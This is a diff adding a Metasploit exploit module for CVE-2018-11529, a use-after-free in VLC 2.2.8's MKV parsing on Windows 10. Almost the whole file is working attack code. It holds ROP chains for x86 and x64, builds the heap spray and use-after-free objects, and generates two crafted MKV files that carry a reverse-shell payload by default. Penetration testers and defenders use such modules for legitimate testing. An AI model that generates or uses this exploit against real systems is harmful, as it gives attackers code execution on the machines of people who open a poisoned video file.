@@ -1,0 +1,306 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit
+  Rank = GreatRanking
+
+  include Msf::Exploit::FILEFORMAT
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'VLC Media Player MKV Use After Free',
+      'Description'    => %q(
+          This module exploits a use after free vulnerability in
+        VideoLAN VLC =< 2.2.8. The vulnerability exists in the parsing of
+        MKV files and affects both 32 bits and 64 bits.
+
+          In order to exploit this, this module will generate two files:
+        The first .mkv file contains the main vulnerability and heap spray,
+        the second .mkv file is required in order to take the vulnerable code
+        path and should be placed under the same directory as the .mkv file.
+
+          This module has been tested against VLC v2.2.8. Tested with payloads
+        windows/exec, windows/x64/exec, windows/shell/reverse_tcp,
+        windows/x64/shell/reverse_tcp. Meterpreter payloads if used can
+        cause the application to crash instead.
+      ),
+      'License'        => MSF_LICENSE,
+      'Author'         => [
+        'Eugene Ng - GovTech',      # Vulnerability Discovery, Exploit
+        'Winston Ho - GovTech',     # Metasploit Module
+      ],
+      'References'     =>
+        [
+          ['CVE', '2018-11529'],
+          ['URL', 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11529'],
+          ['EDB', '44979']
+        ],
+      'Payload'        =>
+        {
+          'Space'          => 0x300,
+          'DisableNops'    => true
+        },
+      'Platform'       => 'win',
+      'Targets'        => [
+        [
+          'VLC 2.2.8 on Windows 10 x86',
+          {
+            'Platform' => 'win',
+            'Arch' => [ARCH_X86],
+            'Ret' => 0x22000020,
+            'ExitPointer' => 0x00411364,
+            'DefaultOptions' => {'PAYLOAD' => 'windows/shell/reverse_tcp'},
+            'RopChain' => [
+              0x0040ae91,             # XCHG EAX,ESP # ADD BYTE PTR [ECX],AL # MOV EAX,DWORD PTR [EAX] # RET
+              0x00407086,             # POP EDI # RETN [vlc.exe]
+              0x00000040,             # 0x00000040-> edx
+              0x0040b058,             # MOV EDX,EDI # POP ESI # POP EDI # POP EBP # RETN [vlc.exe]
+              0x41414141,             # Filler (compensate)
+              0x41414141,             # Filler (compensate)
+              0x41414141,             # Filler (compensate)
+              0x004039c7,             # POP EAX # POP ECX # RETN [vlc.exe]
+              0x22000030,             # Filler (compensate) for rol [eax] below
+              0x41414141,             # Filler (compensate)
+              0x004039c8,             # POP ECX # RETN [vlc.exe]
+              0x0041193d,             # &Writable location [vlc.exe]
+              0x00409d18,             # POP EBX # RETN [vlc.exe]
+              0x00000201,             # 0x00000201-> ebx
+              0x0040a623,             # POP EBP # RETN [vlc.exe]
+              0x0040a623,             # POP EBP # RETN [vlc.exe]
+              0x004036CB,             # POP ESI # RETN [vlc.exe]
+              0x0040848c,             # JMP ds:[EAX * 4 + 40e000] [vlc.exe]
+              0x00407086,             # POP EDI # RETN [vlc.exe]
+              0x0040ae95,             # MOV EAX,DWORD PTR [EAX] # RETN [vlc.exe]
+              0x0040af61,             # PUSHAD # ROL BYTE PTR [EAX], 0FFH # LOOPNE VLC+0XAEF8 (0040AEF8)
+              0x22000020 + 0x5e0,     # Shellcode
+            ]
+          }
+        ],
+        [
+          'VLC 2.2.8 on Windows 10 x64',
+          {
+            'Platform' => 'win',
+            'Arch' => [ARCH_X64],
+            'Ret' => 0x40000040,
+            'ExitPointer' => 0x00412680,
+            'DefaultOptions' => {'PAYLOAD' => 'windows/x64/shell/reverse_tcp'},
+            'RopChain' => [
+              0x004037ac,             # XCHG EAX,ESP # ROL BL,90H # CMP WORD PTR [RCX],5A4DH # JE VLC+0X37C0 (00000000`004037C0) # XOR EAX,EAX # RET
+              0x00403b60,             # POP RCX # RET
+              0x40000040,             # lpAddress
+              0x004011c2,             # POP RDX # RET
+              0x00001000,             # dwSize
+              0x0040ab70,             # JMP VirtualProtect
+              0x40000040 + 0x700,     # Payload
+            ]
+          }
+        ]
+      ],
+      'Privileged'     => false,
+      'DisclosureDate' => 'May 24 2018',
+      'DefaultTarget'  => 1))
+
+    register_options [
+      OptString.new('MKV_ONE', [false, 'mkv that should be opened', '']),
+      OptString.new('MKV_TWO', [false, 'The auxiliary file name.', ''])
+    ]
+
+    deregister_options('FILENAME')
+  end
+
+  def to_bytes(num, length, endianess = 'big')
+    h = format('%<num>x', num: num)
+    s = ('0' * (h.length % 2) + h).rjust(length * 2)
+    s = s.scan(/.{2}/).map! { |x| x.hex.chr }.join
+    endianess == 'big' ?  s : s.reverse
+  end
+
+  def data_size(number, numbytes = (1...9))
+    # encode 'number' as an EBML variable-size integer.
+    numbytes = [numbytes] if numbytes.is_a?(Integer)
+    numbytes.each do |size|
+      bits = size * 7
+      return to_bytes(((1 << bits) + number), size) if number <= (1 << bits) - 2
+    end
+    fail_with(Failure::BadConfig, "Can't store #{number} in #{size} bytes")
+  end
+
+  def build_data(size)
+    block_size = 0x1000
+
+    if target.arch.first == ARCH_X64
+      target_address_packed = [target.ret].pack("<Q")
+      rop_chain = target['RopChain'].map { |qword| [qword].pack("<Q") }.join
+
+      if size == 0x180
+        uaf_object = "\x41" * size
+        uaf_object[0x30, 8] = target_address_packed
+        uaf_object[0x38, 8] = [target.ret + 0x10000].pack("<Q")
+        uaf_object[0x168, 8] = [target.ret + 0x3c0].pack("<Q")
+        uaf_object[0x170, 8] = target_address_packed
+        return uaf_object
+      else
+        block = "\x00" * block_size
+        block[0x0, 4] = "\x41" * 4
+        block[0x8, target_address_packed.length] = target_address_packed
+        block[0x10, target_address_packed.length] = target_address_packed
+
+        block[0x40, 8] = [0x1].pack("<Q")
+        block[0x58, 8] = [target.ret + 0x3a8].pack("<Q")
+        block[0xE4, 8] = [0x1].pack("<Q")
+
+        block[0x1b8, 8] = [target.ret + 0x80].pack("<Q")
+        block[0x3b8, rop_chain.length] = rop_chain
+
+        block[0x6d8, 8] = [target.ret + 0x10].pack("<Q")
+        block[0x700, payload.encoded.length] = payload.encoded
+
+        block *= size / block.length + 1
+      end
+      return block[0, size]
+    elsif target.arch.first == ARCH_X86
+      target_address_packed = [target.ret].pack("<I")
+      rop_chain = target['RopChain'].map { |dword| [dword].pack("<I") }.join
+
+      if size == 0x100
+        uaf_object = "\x41" * size
+        uaf_object[0x28, 4] = target_address_packed
+        uaf_object[0x2c, 4] = [target.ret + 0x10000].pack("<I")
+        uaf_object[0xf4, 4] = [target.ret + 0x2bc].pack("<I")
+        uaf_object[0xf8, 4] = target_address_packed
+        return uaf_object
+      else
+        block = "\x00" * block_size
+        block[0x0, 4] = [0x22000040].pack("<I")
+        block[0x4, target_address_packed.length] = target_address_packed
+        block[0x8, target_address_packed.length] = target_address_packed
+
+        block[0x10, 4] = [0xc85].pack("<I")
+        block[0x30, 4] = [0x1].pack("<I")
+        block[0xc0, 4] = [0x1].pack("<I")
+
+        block[0x194, 4] = [0x2200031c].pack("<I")
+        block[0x2c0, 4] = [0x220002e4].pack("<I")
+        block[0x2f4, 4] = [0x22000310].pack("<I")
+
+        block[0x2f8, rop_chain.length] = rop_chain
+        block[0x564, 4] = [0x22000588].pack("<I")
+        block[0x5e0, payload.encoded.length] = payload.encoded
+
+        block *= size / block.length + 1
+      end
+      return block[0, size]
+    end
+  end
+
+  def generate_mkv
+    # EBML Header
+    doc_type = "\x42\x82" << data_size(8) << "matroska"
+    ebml = "\x1a\x45\xdf\xa3" << data_size(doc_type.length) << doc_type
+
+    # Seek Entries
+    seek_entry = "\x53\xab" << data_size(4)                                  # SeekID
+    seek_entry << "\x15\x49\xa9\x66"                                         # KaxInfo
+    seek_entry << "\x53\xac" << data_size(2) << "\xff" * 2                   # SeekPosition + Index of Segment info
+    seek_entries = "\x4d\xbb" << data_size(seek_entry.length) << seek_entry  # Seek Entry
+
+    seek_entry = "\x53\xab" << data_size(4)                                  # SeekID
+    seek_entry << "\x11\x4d\x9b\x74"                                         # KaxSeekHead
+    seek_entry << "\x53\xac" << data_size(4) << "\xff" * 4                   # SeekPosition + Index of SeekHead
+    seek_entries << "\x4d\xbb" << data_size(seek_entry.length) << seek_entry # Seek Entry
+
+    seek_entry = "\x53\xab" << data_size(4)                                  # SeekID
+    seek_entry << "\x10\x43\xa7\x70"                                         # KaxChapters
+    seek_entry << "\x53\xac" << data_size(4) << "\xff" * 4                   # SeekPosition + Index of Chapters
+    seek_entries << "\x4d\xbb" << data_size(seek_entry.length) << seek_entry # Seek Entry
+
+    # SeekHead
+    seek_head = "\x11\x4d\x9b\x74" << data_size(seek_entries.length) << seek_entries
+
+    # Void
+    void = "\xec" << data_size(2) << "\x41" # Trigger bug with an out-of-order element
+
+    # Info
+    segment_uid = "\x73\xa4" << data_size(16) << rand_text(16)
+    info = "\x15\x49\xa9\x66" << data_size(segment_uid.length) << segment_uid
+
+    # Chapters
+    chapter_segment_uid = "\x6e\x67" << data_size(16) << rand_text(16)
+    chapter_atom = "\xb6" << data_size(chapter_segment_uid.length) << chapter_segment_uid
+    edition_entry = "\x45\xb9" << data_size(chapter_atom.length) << chapter_atom
+    chapters = "\x10\x43\xa7\x70" << data_size(edition_entry.length) << edition_entry
+
+    if target.arch.first == ARCH_X86
+      size = 0x100
+      count = 30
+    elsif target.arch.first == ARCH_X64
+      size = 0x180
+      count = 60
+    end
+
+    # Attachments
+    attached_files = ""
+    mime = "\x46\x60" << data_size(24) << "application/octet-stream"
+    data = build_data(size)
+    data = "\x46\x5c" << data_size(data.length) << data
+    500.times do
+      uid = "\x46\xae" << data_size(8) << rand_text(8)
+      file_name = "\x46\x6e" << data_size(8) << rand_text(8)
+      header = "\x61\xa7" << data_size(uid.length + file_name.length + mime.length + data.length)
+
+      attached_files << header << file_name << mime << uid << data
+    end
+    attachments = "\x19\x41\xa4\x69" << data_size(attached_files.length) << attached_files
+
+    # Cluster
+    pay_load = build_data(0xfff000)
+    # Since the payload is simply repeated payload blocks appended to cluster then segment_data,
+    # we return the simple_block and the count to process later instead.
+    # This should result is overall lowered memory usage during payload generation
+    simple_block = "\xa3" << data_size(pay_load.length) << pay_load
+    simple_blocks_len = simple_block.length * count
+    time_code = "\xe7" << data_size(1) << "\x00"
+    cluster = "\x1f\x43\xb6\x75" << data_size(time_code.length + simple_blocks_len) << time_code
+
+    # Concatenate everything
+    segment_data = seek_head << void << info << chapters << attachments << cluster
+    segment = "\x18\x53\x80\x67" << data_size(segment_data.length + simple_blocks_len) << segment_data
+    mkv = ebml << segment
+
+    return mkv, simple_block, count
+  end
+
+  def exploit
+    mkv1, simple_block, count = generate_mkv
+    mkv2 = mkv1[0, 0x4f] + "\x15\x49\xa9\x66" + data_size(10)
+
+    tmpname = rand_text_alpha_lower(3..8)
+    f1 = datastore['MKV_ONE'].empty? ? "#{tmpname}-part1.mkv" : datastore['MKV_ONE']
+    f1 << '.mkv' unless f1.downcase.end_with?('.mkv')
+
+    f2 = datastore['MKV_TWO'].empty? ? "#{tmpname}-part2.mkv" : datastore['MKV_TWO']
+    f2 << '.mkv' unless f2.downcase.end_with?('.mkv')
+
+    file_format_filename(f1)
+    file_create(mkv1)
+    print_status("Created #{f1}. Target should open this file")
+
+    file_format_filename(f2)
+    file_create(mkv2)
+    print_status("Created #{f2}. Put this file in the same directory as #{f1}")
+
+    print_status("Appending blocks to #{f1}")
+    path = File.join(Msf::Config.local_directory, f1)
+    full_path = ::File.expand_path(path)
+    File.open(full_path, 'ab') do |fd|
+      count.times { fd.write(simple_block) }
+    end
+    print_good("Succesfully appended blocks to #{f1}")
+  end
+
+  def file_format_filename(name = '')
+    name.empty? ? @fname : @fname = name
+  end
+end
